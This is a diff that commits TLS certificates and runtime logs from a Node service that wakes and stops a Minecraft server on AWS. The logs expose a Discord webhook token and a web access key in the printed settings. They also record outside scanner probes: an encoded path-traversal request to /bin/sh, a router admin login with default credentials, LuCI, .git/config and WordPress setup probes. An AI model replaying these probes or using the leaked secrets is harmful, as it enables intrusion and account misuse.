+MDMxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBFbmNyeXB0MQwwCgYDVQQD
+EwNSMTAwHhcNMjQwOTA5MDUwNjIzWhcNMjQxMjA4MDUwNjIyWjAXMRUwEwYDVQQD
+Ewx3YWtlLnNlbmkua3IwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC3
+M/Tpy9HU9CWkommR1aj2TcjRk1xYHBmAa8EPp/Rstb94oGXLOCS+1Q/2UoKMdi0q
+G7SFmiR9UQV7pWapmVstLIXPltfdEF4xZEOFEP6s7O9dLZy60ARIJ9epY6as+L9k
+14A7zZzThePiICxIEDx5sah2090TNKMKh/PVcCRxDh1Cpys+3DV41GNygelH2iql
+j5FvxmcXmKC+KQibXNXWbcXk7SVoxUYzeKabnBamJsqq+1Z/Ty1lMOOjBbtQdclW
+WcDg5/OCAH4rSLgl0/l0RKskezf6wNra9hnGpIL4raAUe6a15EJ+0O8962vw28NT
+wvzN63txFNEalfx/GkkDAgMBAAGjggIPMIICCzAOBgNVHQ8BAf8EBAMCBaAwHQYD
+VR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMAwGA1UdEwEB/wQCMAAwHQYDVR0O
+BBYEFGUOZ4C6dmL+VGfY/IJThnZWqlMdMB8GA1UdIwQYMBaAFLu8w0el5LypxsOk
+cgwQjaI14cjoMFcGCCsGAQUFBwEBBEswSTAiBggrBgEFBQcwAYYWaHR0cDovL3Ix
+MC5vLmxlbmNyLm9yZzAjBggrBgEFBQcwAoYXaHR0cDovL3IxMC5pLmxlbmNyLm9y
+Zy8wFwYDVR0RBBAwDoIMd2FrZS5zZW5pLmtyMBMGA1UdIAQMMAowCAYGZ4EMAQIB
+MIIBAwYKKwYBBAHWeQIEAgSB9ASB8QDvAHYA3+FW66oFr7WcD4ZxjajAMk6uVtlu
+p/WlagHRwTu+UlwAAAGR1WKWsgAABAMARzBFAiEA6mojPAG68EWybLTWrwN8TVQ1
+psLQGLPELgHfhx2WC+kCIBkyX036QJAID+kEw0tXxpfk6ddPT/KfWWeG346WAOEa
+AHUASLDja9qmRzQP5WoC+p0w6xxSActW3SyB2bu/qznYhHMAAAGR1WKWJgAABAMA
+RjBEAiAC529CBA5pcbhivXRV7eavqq26DZDgrHJ1CqnHfU9s1AIgA+Qjd6xJyEVa
+pViK0Cc+uNNiFnZOXidYC/nWOBf0uK0wDQYJKoZIhvcNAQELBQADggEBAHmXAOyk
+hjx4c/IHeT+Aoto+/mKT7ajlts6Gb5MK1BJrbsKmz1XVQx9dInS1Ud/4vPT9MlF6
+ChyE98J9hwkobobt/U8QfHsgtAZVSfoAZWedCDd/ebrLftdjLY2UqkB3jALpha9b
+RmnNrzT0euI5D/a4bNHaoInqjqYIex8AH0LcxMTNT+PV6sVtCa+ukn8OTvVUhg8x
+yKYaFXNBBs+3tcf4qKVljQvE3s+ER4e+9IBBaFMVYheZlEjTbfoodb7wo6KvwC0w
+sfY9Hhri4rJbZ7icAscxmijnU9OWyInuCr0XNUNhKy/iQvlcnL7xFqudLrCwGf0o
+UCI6/kGPUj9l3ME=
+-----END CERTIFICATE-----
+-----BEGIN CERTIFICATE-----
+MIIFBTCCAu2gAwIBAgIQS6hSk/eaL6JzBkuoBI110DANBgkqhkiG9w0BAQsFADBP
+MQswCQYDVQQGEwJVUzEpMCcGA1UEChMgSW50ZXJuZXQgU2VjdXJpdHkgUmVzZWFy
+Y2ggR3JvdXAxFTATBgNVBAMTDElTUkcgUm9vdCBYMTAeFw0yNDAzMTMwMDAwMDBa
+Fw0yNzAzMTIyMzU5NTlaMDMxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBF
+bmNyeXB0MQwwCgYDVQQDEwNSMTAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
+AoIBAQDPV+XmxFQS7bRH/sknWHZGUCiMHT6I3wWd1bUYKb3dtVq/+vbOo76vACFL
+YlpaPAEvxVgD9on/jhFD68G14BQHlo9vH9fnuoE5CXVlt8KvGFs3Jijno/QHK20a
+/6tYvJWuQP/py1fEtVt/eA0YYbwX51TGu0mRzW4Y0YCF7qZlNrx06rxQTOr8IfM4
+FpOUurDTazgGzRYSespSdcitdrLCnF2YRVxvYXvGLe48E1KGAdlX5jgc3421H5KR
+mudKHMxFqHJV8LDmowfs/acbZp4/SItxhHFYyTr6717yW0QrPHTnj7JHwQdqzZq3
+DZb3EoEmUVQK7GH29/Xi8orIlQ2NAgMBAAGjgfgwgfUwDgYDVR0PAQH/BAQDAgGG
+MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATASBgNVHRMBAf8ECDAGAQH/
+AgEAMB0GA1UdDgQWBBS7vMNHpeS8qcbDpHIMEI2iNeHI6DAfBgNVHSMEGDAWgBR5
+tFnme7bl5AFzgAiIyBpY9umbbjAyBggrBgEFBQcBAQQmMCQwIgYIKwYBBQUHMAKG
+Fmh0dHA6Ly94MS5pLmxlbmNyLm9yZy8wEwYDVR0gBAwwCjAIBgZngQwBAgEwJwYD
+VR0fBCAwHjAcoBqgGIYWaHR0cDovL3gxLmMubGVuY3Iub3JnLzANBgkqhkiG9w0B
+AQsFAAOCAgEAkrHnQTfreZ2B5s3iJeE6IOmQRJWjgVzPw139vaBw1bGWKCIL0vIo
+zwzn1OZDjCQiHcFCktEJr59L9MhwTyAWsVrdAfYf+B9haxQnsHKNY67u4s5Lzzfd
+u6PUzeetUK29v+PsPmI2cJkxp+iN3epi4hKu9ZzUPSwMqtCceb7qPVxEbpYxY1p9
+1n5PJKBLBX9eb9LU6l8zSxPWV7bK3lG4XaMJgnT9x3ies7msFtpKK5bDtotij/l0
+GaKeA97pb5uwD9KgWvaFXMIEt8jVTjLEvwRdvCn294GPDF08U8lAkIv7tghluaQh
+1QnlE4SEN4LOECj8dsIGJXpGUk3aU3KkJz9icKy+aUgA+2cP21uh6NcDIS3XyfaZ
+QjmDQ993ChII8SXWupQZVBiIpcWO4RqZk3lr7Bz5MUCwzDIA359e57SSq5CCkY0N
+4B6Vulk7LktfwrdGNVI5BsC9qqxSwSKgRJeZ9wygIaehbHFHFhcBaMDKpiZlBHyz
+rsnnlFXCb5s8HKn5LsUgGvB24L7sGNZP2CX7dhHov+YhD+jozLW2p9W4959Bz2Ei
+RmqDtmiXLnzqTpXbI+suyCsohKRg6Un0RC47+cpiVwHiXZAW+cn8eiNIjqbVgXLx
+KPpdzvvtTnOPlC7SQZSYmdunr3Bf9b77AiC/ZidstK36dRILKz7OA54=
+-----END CERTIFICATE-----
+ 
+2024-09-09 17:03:31 info: [WebServer] Starting web server on *: 443 
+2024-09-09 17:03:31 error: [WebServer] Error getting hostname 
+2024-09-09 17:04:27 info: to ==> https://wake.seni.kr/ 
+2024-09-09 17:04:28 info: to ==> https://wake.seni.kr/ 
+[31m[nodemon] app crashed - waiting for file changes before starting...[39m
+[33m[nodemon] 3.1.4[39m
+[33m[nodemon] reading config ./nodemon.json[39m
+[33m[nodemon] to restart at any time, enter `rs`[39m
+[33m[nodemon] or send SIGHUP to 10232 to restart[39m
+[33m[nodemon] watching path(s): src/**/*[39m
+[33m[nodemon] watching extensions: ts,json,hbs[39m
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 10252[39m
+[33m[nodemon] watching 11 files[39m
+2024-09-09 17:05:20 info: ......................... 
+2024-09-09 17:05:20 info: ... A new story begin ... 
+2024-09-09 17:05:20 info: ......................... 
+2024-09-09 17:05:23 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 17:05:23 info: [WebServer] Getting server status 
+2024-09-09 17:05:23 info: [WebServer] Starting web server on *: 443 
+2024-09-09 17:05:24 error: [WebServer] Error getting hostname 
+2024-09-09 17:05:24 info: to ==> https://wake.seni.kr/ 
+2024-09-09 17:05:27 info: to ==> https://wake.seni.kr/ 
+2024-09-09 17:07:24 error: ETIMEDOUT 
+2024-09-09 17:07:24 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 17:07:24 info: status and waking 
+2024-09-09 17:07:24 info: -1 
+2024-09-09 17:07:24 info: false 
+2024-09-09 17:10:34 info: to ==> https://speed.cloudflare.com/cdn-cgi/trace 
+2024-09-09 17:10:43 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-09 17:24:30 info: [WebServer](::ffff:118.235.2.162) Wake up server was Sleeping 
+2024-09-09 17:24:30 info: [WebServer] Starting Minecraft Server 
+2024-09-09 17:25:05 warn: [WebServer] Error/Warn starting server: [WARNING]: provided hosts list is empty, only localhost is available. Note that
+the implicit localhost does not match 'all'
+[WARNING]: provided hosts list is empty, only localhost is available. Note that
+the implicit localhost does not match 'all'
+ 
+2024-09-09 17:25:05 info: [WebServer] Started server: /opt/web/CloudMCServerManager
+
+PLAY [Persist local Ansible to S3] *********************************************
+
+TASK [Create temporary directory] **********************************************
+changed: [localhost]
+
+TASK [Create an archive from the local Ansible + utilities] ********************
+changed: [localhost]
+
+TASK [Push ansible archive to S3] **********************************************
+changed: [localhost]
+
+TASK [Remove temporary directory] **********************************************
+changed: [localhost]
+
+PLAY RECAP *********************************************************************
+localhost                  : ok=4    changed=4    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   
+
+
+PLAY [Resizing ASG] ************************************************************
+
+TASK [Set auto-scaling group size to 1] ****************************************
+changed: [localhost]
+
+PLAY RECAP *********************************************************************
+localhost                  : ok=1    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   
+
+
+------------------ 
+2024-09-09 17:25:05 info: [WebServer] Getting server status 
+2024-09-09 17:26:05 info: to ==> https://146.56.112.234:80/ 
+2024-09-09 17:27:05 error: ETIMEDOUT 
+2024-09-09 17:27:05 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 17:27:05 info: status and waking 
+2024-09-09 17:27:05 info: -1 
+2024-09-09 17:27:05 info: true 
+2024-09-09 17:27:35 info: seniorious28, 43.203.153.128, craft.seni.kr 
+2024-09-09 17:27:37 info: [object Object] 
+2024-09-09 17:28:05 info: [WebServer] Getting server status 
+2024-09-09 17:30:06 error: ETIMEDOUT 
+2024-09-09 17:30:06 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 17:30:06 info: status and waking 
+2024-09-09 17:30:06 info: -1 
+2024-09-09 17:30:06 info: true 
+2024-09-09 17:31:06 info: [WebServer] Getting server status 
+2024-09-09 17:31:39 info: to ==> https://146.56.112.234/druid/index.html 
+2024-09-09 17:33:06 error: ETIMEDOUT 
+2024-09-09 17:33:06 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 17:33:06 info: status and waking 
+2024-09-09 17:33:06 info: -1 
+2024-09-09 17:33:06 info: true 
+2024-09-09 17:34:06 info: [WebServer] Getting server status 
+2024-09-09 17:35:38 info: [WebServer](::ffff:118.235.2.162) Shutdown server 
+2024-09-09 17:36:06 error: ETIMEDOUT 
+2024-09-09 17:36:06 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 17:36:06 info: status and waking 
+2024-09-09 17:36:06 info: -1 
+2024-09-09 17:36:06 info: true 
+2024-09-09 17:36:38 info: [WebServer] Killing Minecraft Server, restart: false 
+2024-09-09 17:36:40 error: [WebServer] Error stopping server: Error: Command failed: /opt/web/CloudMCServerManager/stop.sh --extra-vars "backup=0"
+ 
+2024-09-09 17:51:49 info: to ==> https://146.56.112.234:80/ 
+2024-09-09 17:51:57 info: to ==> https://146.56.112.234/ 
+2024-09-09 17:52:38 info: to ==> https://146.56.112.234:80/ 
+2024-09-09 17:55:39 info: to ==> https://146.56.112.234:80/ 
+2024-09-09 18:02:57 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-09 18:18:55 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-09 18:23:46 info: to ==> https://146.56.112.234:80/ 
+URIError: Failed to decode param '/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/layer.js:172:12)
+    at Layer.match (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/layer.js:123:27)
+    at matchLayer (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:585:18)
+    at next (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:226:15)
+    at jsonParser (/opt/web/mcsleepingserverstarter/node_modules/body-parser/lib/types/json.js:122:7)
+    at Layer.handle [as handle_request] (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:328:13)
+    at /opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/opt/web/mcsleepingserverstarter/node_modules/express/lib/router/index.js:346:12)
+2024-09-09 18:40:38 info: to ==> https://speed.cloudflare.com/cdn-cgi/trace 
+2024-09-09 18:47:40 info: to ==> https://146.56.112.234/ 
+2024-09-09 18:50:47 info: to ==> https://127.0.0.1/ 
+2024-09-09 18:51:02 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-09 19:02:51 info: to ==> https://146.56.112.234:80/ 
+2024-09-09 19:06:59 info: to ==> https://146.56.112.234:80/ 
+2024-09-09 19:27:11 info: to ==> https://146.56.112.234/ 
+2024-09-09 19:43:04 info: to ==> https://localhost/ 
+2024-09-09 19:46:35 info: to ==> https://146.56.112.234/.git/config 
+2024-09-09 19:47:42 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-09 20:20:00 info: to ==> https://146.56.112.234/ 
+2024-09-09 20:26:04 info: to ==> https://146.56.112.234/ 
+2024-09-09 20:29:20 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-09 20:31:49 info: to ==> https://146.56.112.234:80/ 
+2024-09-09 20:37:02 info: to ==> https://146.56.112.234/ 
+2024-09-09 20:48:42 info: to ==> https://146.56.112.234:80/ 
+2024-09-09 21:17:58 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-09 21:37:11 info: to ==> https://146.56.112.234:80/ 
+2024-09-09 21:39:42 info: to ==> https://146.56.112.234:80/ 
+2024-09-09 21:43:14 info: to ==> https://wake.seni.kr/wp-admin/setup-config.php?step=1 
+2024-09-09 21:43:14 info: to ==> https://wake.seni.kr/wordpress/wp-admin/setup-config.php?step=1 
+2024-09-09 22:09:05 info: to ==> https://146.56.112.234/ 
+2024-09-09 22:12:21 info: to ==> https://localhost/ 
+2024-09-09 22:26:06 info: to ==> https://undefined/ 
+2024-09-09 23:00:33 info: [WebServer](::ffff:61.43.124.130) Wake up server was Sleeping 
+2024-09-09 23:00:33 info: [WebServer] Starting Minecraft Server 
+2024-09-09 23:00:46 info: [WebServer] Started server: /opt/web/CloudMCServerManager
+
+PLAY [Persist local Ansible to S3] *********************************************
+
+TASK [Create temporary directory] **********************************************
+changed: [localhost]
+
+TASK [Create an archive from the local Ansible + utilities] ********************
+changed: [localhost]
+
+TASK [Push ansible archive to S3] **********************************************
+changed: [localhost]
+
+TASK [Remove temporary directory] **********************************************
+changed: [localhost]
+
+PLAY RECAP *********************************************************************
+localhost                  : ok=4    changed=4    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   
+
+
+PLAY [Resizing ASG] ************************************************************
+
+TASK [Set auto-scaling group size to 1] ****************************************
+ok: [localhost]
+
+PLAY RECAP *********************************************************************
+localhost                  : ok=1    changed=0    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   
+
+
+------------------ 
+2024-09-09 23:00:46 info: [WebServer] Getting server status 
+2024-09-09 23:01:14 info: to ==> https://146.56.112.234:80/ 
+2024-09-09 23:02:26 info: to ==> https://undefined/boaform/admin/formLogin?username=ec8&psd=ec8 
+2024-09-09 23:02:47 error: ETIMEDOUT 
+2024-09-09 23:02:47 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 23:02:47 info: status and waking 
+2024-09-09 23:02:47 info: -1 
+2024-09-09 23:02:47 info: true 
+2024-09-09 23:03:47 info: [WebServer] Getting server status 
+2024-09-09 23:05:47 error: ETIMEDOUT 
+2024-09-09 23:05:47 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 23:05:47 info: status and waking 
+2024-09-09 23:05:47 info: -1 
+2024-09-09 23:05:47 info: true 
+2024-09-09 23:06:47 info: [WebServer] Getting server status 
+2024-09-09 23:06:53 info: to ==> https://wake.seni.kr/ 
+2024-09-09 23:08:47 error: ETIMEDOUT 
+2024-09-09 23:08:47 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 23:08:47 info: status and waking 
+2024-09-09 23:08:47 info: -1 
+2024-09-09 23:08:47 info: true 
+2024-09-09 23:09:47 info: [WebServer] Getting server status 
+2024-09-09 23:11:48 error: ETIMEDOUT 
+2024-09-09 23:11:48 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 23:11:48 info: status and waking 
+2024-09-09 23:11:48 info: -1 
+2024-09-09 23:11:48 info: true 
+2024-09-09 23:12:48 info: [WebServer] Getting server status 
+2024-09-09 23:14:48 error: ETIMEDOUT 
+2024-09-09 23:14:48 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 23:14:48 info: status and waking 
+2024-09-09 23:14:48 info: -1 
+2024-09-09 23:14:48 info: true 
+2024-09-09 23:15:48 info: [WebServer] Getting server status 
+2024-09-09 23:17:48 error: ETIMEDOUT 
+2024-09-09 23:17:48 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 23:17:48 info: status and waking 
+2024-09-09 23:17:48 info: -1 
+2024-09-09 23:17:48 info: true 
+2024-09-09 23:18:48 info: [WebServer] Getting server status 
+2024-09-09 23:20:48 error: ETIMEDOUT 
+2024-09-09 23:20:48 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 23:20:48 info: status and waking 
+2024-09-09 23:20:48 info: -1 
+2024-09-09 23:20:48 info: true 
+2024-09-09 23:21:48 info: [WebServer] Getting server status 
+2024-09-09 23:23:49 error: ETIMEDOUT 
+2024-09-09 23:23:49 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 23:23:49 info: status and waking 
+2024-09-09 23:23:49 info: -1 
+2024-09-09 23:23:49 info: true 
+2024-09-09 23:24:49 info: [WebServer] Getting server status 
+2024-09-09 23:26:49 error: ETIMEDOUT 
+2024-09-09 23:26:49 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 23:26:49 info: status and waking 
+2024-09-09 23:26:49 info: -1 
+2024-09-09 23:26:49 info: true 
+2024-09-09 23:27:49 info: [WebServer] Getting server status 
+2024-09-09 23:29:50 error: ETIMEDOUT 
+2024-09-09 23:29:50 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 23:29:50 info: status and waking 
+2024-09-09 23:29:50 info: -1 
+2024-09-09 23:29:50 info: true 
+2024-09-09 23:30:50 info: [WebServer] Getting server status 
+2024-09-09 23:32:50 error: ETIMEDOUT 
+2024-09-09 23:32:50 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 23:32:50 info: status and waking 
+2024-09-09 23:32:50 info: -1 
+2024-09-09 23:32:50 info: true 
+2024-09-09 23:33:50 info: [WebServer] Getting server status 
+[33m[nodemon] files triggering change check: src/sleepingWeb.ts[39m
+[33m[nodemon] matched rule: /opt/web/mcsleepingserverstarter/src/**/*[39m
+[33m[nodemon] changes after filters (before/after): 1/1[39m
+[32m[nodemon] restarting due to changes...[39m
+[33m[nodemon] src/sleepingWeb.ts[39m
+
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 11626[39m
+2024-09-09 23:34:26 info: ......................... 
+2024-09-09 23:34:26 info: ... A new story begin ... 
+2024-09-09 23:34:26 info: ......................... 
+2024-09-09 23:34:28 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 23:34:28 info: [WebServer] Getting server status 
+2024-09-09 23:34:28 info: [WebServer] Starting web server on *: 443 
+2024-09-09 23:36:01 info: [WebServer](::ffff:61.43.124.130) Wake up server was Sleeping 
+2024-09-09 23:36:01 info: [WebServer] Starting Minecraft Server 
+2024-09-09 23:36:20 info: [WebServer] Started server: /opt/web/CloudMCServerManager
+
+PLAY [Persist local Ansible to S3] *********************************************
+
+TASK [Create temporary directory] **********************************************
+changed: [localhost]
+
+TASK [Create an archive from the local Ansible + utilities] ********************
+changed: [localhost]
+
+TASK [Push ansible archive to S3] **********************************************
+changed: [localhost]
+
+TASK [Remove temporary directory] **********************************************
+changed: [localhost]
+
+PLAY RECAP *********************************************************************
+localhost                  : ok=4    changed=4    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   
+
+
+PLAY [Resizing ASG] ************************************************************
+
+TASK [Set auto-scaling group size to 1] ****************************************
+ok: [localhost]
+
+PLAY RECAP *********************************************************************
+localhost                  : ok=1    changed=0    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   
+
+
+------------------ 
+2024-09-09 23:36:20 info: [WebServer] Getting server status 
+2024-09-09 23:36:28 error: ETIMEDOUT 
+2024-09-09 23:36:28 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 23:36:28 info: status and waking 
+2024-09-09 23:36:28 info: -1 
+2024-09-09 23:36:28 info: true 
+2024-09-09 23:37:28 info: [WebServer] Getting server status 
+2024-09-09 23:38:20 error: ETIMEDOUT 
+2024-09-09 23:38:20 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 23:38:20 info: status and waking 
+2024-09-09 23:38:20 info: -1 
+2024-09-09 23:38:20 info: true 
+2024-09-09 23:38:33 info: [WebServer](::ffff:61.43.124.130) Doing nothing server was Starting 
+2024-09-09 23:38:34 info: [WebServer](::ffff:61.43.124.130) Doing nothing server was Starting 
+2024-09-09 23:39:20 info: [WebServer] Getting server status 
+2024-09-09 23:39:28 error: ETIMEDOUT 
+2024-09-09 23:39:28 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 23:39:28 info: status and waking 
+2024-09-09 23:39:28 info: -1 
+2024-09-09 23:39:28 info: true 
+2024-09-09 23:40:28 info: [WebServer] Getting server status 
+2024-09-09 23:41:21 error: ETIMEDOUT 
+2024-09-09 23:41:21 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 23:41:21 info: status and waking 
+2024-09-09 23:41:21 info: -1 
+2024-09-09 23:41:21 info: true 
+2024-09-09 23:41:36 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-09 23:41:46 info: to ==> https://146.56.112.234:80/ 
+2024-09-09 23:42:21 info: [WebServer] Getting server status 
+2024-09-09 23:42:29 error: ETIMEDOUT 
+2024-09-09 23:42:29 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 23:42:29 info: status and waking 
+2024-09-09 23:42:29 info: -1 
+2024-09-09 23:42:29 info: true 
+2024-09-09 23:43:29 info: [WebServer] Getting server status 
+2024-09-09 23:44:21 error: ETIMEDOUT 
+2024-09-09 23:44:21 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 23:44:21 info: status and waking 
+2024-09-09 23:44:21 info: -1 
+2024-09-09 23:44:21 info: true 
+2024-09-09 23:45:21 info: [WebServer] Getting server status 
+2024-09-09 23:45:29 error: ETIMEDOUT 
+2024-09-09 23:45:29 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 23:45:29 info: status and waking 
+2024-09-09 23:45:29 info: -1 
+2024-09-09 23:45:29 info: true 
+2024-09-09 23:46:29 info: [WebServer] Getting server status 
+[33m[nodemon] 3.1.4[39m
+[33m[nodemon] reading config ./nodemon.json[39m
+[33m[nodemon] to restart at any time, enter `rs`[39m
+[33m[nodemon] or send SIGHUP to 12219 to restart[39m
+[33m[nodemon] watching path(s): src/**/*[39m
+[33m[nodemon] watching extensions: ts,json,hbs[39m
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 12239[39m
+[33m[nodemon] watching 11 files[39m
+2024-09-09 23:47:19 info: ......................... 
+2024-09-09 23:47:19 info: ... A new story begin ... 
+2024-09-09 23:47:19 info: ......................... 
+2024-09-09 23:47:21 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 23:47:21 info: [WebServer] Getting server status 
+2024-09-09 23:47:21 info: [WebServer] Starting web server on *: 443 
+2024-09-09 23:47:22 info: [WebServer] Server is responding with 1 players 
+2024-09-09 23:47:22 info: status and waking 
+2024-09-09 23:47:22 info: -1 
+2024-09-09 23:47:22 info: false 
+2024-09-09 23:47:52 info: [WebServer](::ffff:61.43.124.130) Stopping server was Running 
+2024-09-09 23:47:52 info: [WebServer] Killing Minecraft Server, restart: false 
+2024-09-09 23:47:55 error: [WebServer] Error stopping server: Error: Command failed: /opt/web/CloudMCServerManager/stop.sh --extra-vars "backup=1"
+ 
+2024-09-09 23:48:22 info: [WebServer] Getting server status 
+2024-09-09 23:48:22 info: [WebServer] Server is responding with 1 players 
+2024-09-09 23:48:22 info: status and waking 
+2024-09-09 23:48:22 info: 1 
+2024-09-09 23:48:22 info: false 
+2024-09-09 23:48:38 info: [WebServer](::ffff:61.43.124.130) Stopping server was Running 
+2024-09-09 23:48:38 info: [WebServer] Killing Minecraft Server, restart: false 
+2024-09-09 23:48:41 error: [WebServer] Error stopping server: Error: Command failed: /opt/web/CloudMCServerManager/stop.sh --extra-vars "backup=1"
+ 
+2024-09-09 23:49:22 info: [WebServer] Getting server status 
+2024-09-09 23:49:22 info: [WebServer] Server is responding with 1 players 
+2024-09-09 23:49:22 info: status and waking 
+2024-09-09 23:49:22 info: 1 
+2024-09-09 23:49:22 info: false 
+2024-09-09 23:50:22 info: [WebServer] Getting server status 
+2024-09-09 23:50:22 info: [WebServer] Server is responding with 1 players 
+2024-09-09 23:50:22 info: status and waking 
+2024-09-09 23:50:22 info: 1 
+2024-09-09 23:50:22 info: false 
+2024-09-09 23:51:22 info: [WebServer] Getting server status 
+2024-09-09 23:51:22 info: [WebServer] Server is responding with 1 players 
+2024-09-09 23:51:22 info: status and waking 
+2024-09-09 23:51:22 info: 1 
+2024-09-09 23:51:22 info: false 
+2024-09-09 23:52:09 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-09 23:52:22 info: [WebServer] Getting server status 
+2024-09-09 23:52:22 info: [WebServer] Server is responding with 1 players 
+2024-09-09 23:52:22 info: status and waking 
+2024-09-09 23:52:22 info: 1 
+2024-09-09 23:52:22 info: false 
+2024-09-09 23:53:22 info: [WebServer] Getting server status 
+2024-09-09 23:53:22 info: [WebServer] Server is responding with 1 players 
+2024-09-09 23:53:22 info: status and waking 
+2024-09-09 23:53:22 info: 1 
+2024-09-09 23:53:22 info: false 
+2024-09-09 23:54:22 info: [WebServer] Getting server status 
+2024-09-09 23:54:23 info: [WebServer] Server is responding with 1 players 
+2024-09-09 23:54:23 info: status and waking 
+2024-09-09 23:54:23 info: 1 
+2024-09-09 23:54:23 info: false 
+2024-09-09 23:55:23 info: [WebServer] Getting server status 
+2024-09-09 23:55:23 info: [WebServer] Server is responding with 1 players 
+2024-09-09 23:55:23 info: status and waking 
+2024-09-09 23:55:23 info: 1 
+2024-09-09 23:55:23 info: false 
+2024-09-09 23:56:23 info: [WebServer] Getting server status 
